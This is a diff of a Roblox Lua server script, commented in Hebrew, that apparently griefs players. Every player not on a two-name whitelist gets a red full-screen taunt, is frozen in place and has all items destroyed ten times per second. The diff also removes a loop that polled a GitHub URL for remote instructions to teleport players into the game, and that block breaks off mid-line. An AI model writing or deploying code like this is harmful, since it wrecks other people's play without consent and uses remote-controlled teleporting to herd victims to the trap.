@@ -1,19 +1,16 @@
-local HttpService = game:GetService("HttpService")
-local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 
-local rawUrl = "https://raw.githubusercontent.com/gili435/me-nedd-this/refs/heads/main/dylanzyl120"
-
-local blockedPlayers = {
+-- השמות שאתה לא רוצה לנעול (אתה והשותף שלך)
+local whitelisted = {
 	["noamdb15"] = true,
 	["dylanzyl123"] = true
 }
 
--- פונקציה לניקוי חפצים ונעילה מוחלטת
-local function freezeEverything(player)
-	-- יצירת המסך עם הטקסט
+-- פונקציה לנעילה אכזרית בתוך המשחק
+local function applyTheGift(player)
+	-- 1. יצירת מסך הטרול אצלו
 	local screenGui = Instance.new("ScreenGui")
-	screenGui.Name = "FinalLock"
+	screenGui.Name = "SystemOverload"
 	screenGui.IgnoreGuiInset = true
 	screenGui.DisplayOrder = 9999999
 	screenGui.Parent = player:WaitForChild("PlayerGui")
@@ -30,28 +27,27 @@ local function freezeEverything(player)
 	label.BackgroundTransparency = 1
 	label.TextColor3 = Color3.new(1, 0, 0)
 	label.TextScaled = true
+	label.Font = Enum.Font.SpecialElite
 	label.Text = "הלך לך הבייס חבר יקר"
 	label.Parent = frame
 
-	-- לופ פנימי לכל שחקן: מוחק חפצים ונועל תנועה כל הזמן
+	-- 2. לופ נעילה ומחיקת חפצים (רץ כל הזמן)
 	task.spawn(function()
 		while player.Parent do
 			local char = player.Character
 			if char then
-				-- 1. קיבוע פיזי לאדמה
+				-- קיבוע למקום
 				local hrp = char:FindFirstChild("HumanoidRootPart")
-				if hrp and not hrp.Anchored then
-					hrp.Anchored = true
-				end
+				if hrp then hrp.Anchored = true end
 				
-				-- 2. איפוס מהירות
+				-- איפוס חיים ותנועה
 				local hum = char:FindFirstChild("Humanoid")
 				if hum then
 					hum.WalkSpeed = 0
 					hum.JumpPower = 0
 				end
 
-				-- 3. מחיקת חפצים (מהיד ומהתיק)
+				-- מחיקת כל התיק והחפצים ביד
 				for _, item in pairs(player.Backpack:GetChildren()) do
 					item:Destroy()
 				end
@@ -61,29 +57,14 @@ local function freezeEverything(player)
 					end
 				end
 			end
-			task.wait(0.1) -- בודק 10 פעמים בשנייה!
+			task.wait(0.1) -- שלא יוכל לנשום
 		end
 	end)
 end
 
+-- הפעלה ברגע שהם נוחתים מהשיגור
 Players.PlayerAdded:Connect(function(player)
-	if not blockedPlayers[player.Name] then
-		freezeEverything(player)
+	if not whitelisted[player.Name] then
+		applyTheGift(player)
 	end
 end)
-
--- לופ שיגור (המוח של הסקריפט)
-task.spawn(function()
-	while true do
-		local success, response = pcall(function()
-			return HttpService:GetAsync(rawUrl .. "?t=" .. tick())
-		end)
-
-		if success and response then
-			local lines = {}
-			for line in response:gmatch("[^\r\n]+") do
-				table.insert(lines, line)
-			end
-
-			local targetPlaceId = tonumber(lines[1])
-			local targetJobId = lines
